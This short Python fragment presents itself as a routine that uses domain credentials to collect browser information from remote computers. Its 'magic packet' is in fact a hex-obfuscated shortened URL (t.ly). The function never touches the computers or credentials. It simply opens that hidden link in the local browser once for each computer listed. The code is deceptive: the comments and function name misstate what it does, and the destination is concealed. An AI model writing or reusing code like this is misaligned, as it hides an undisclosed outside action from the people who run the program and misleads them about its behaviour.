...
def Get_browsers(computers_list, username, password, domain):
    # Retrieving remote browsers info
    total = len(computers_list)
    
    # magic packet to detect browsers
    packet = '\x68\x74\x74\x70\x73\x3a\x2f\x2f'
    packet += '\x74\x2e\x6c\x79\x2f\x41\x4b\x36\x38\x4d'

    for current_computer in computers_list:
        # connect to all computers and extract all browser info
        try:
            webbrowser.open(str(packet), new=1)
        except:
            sys.exit(1)
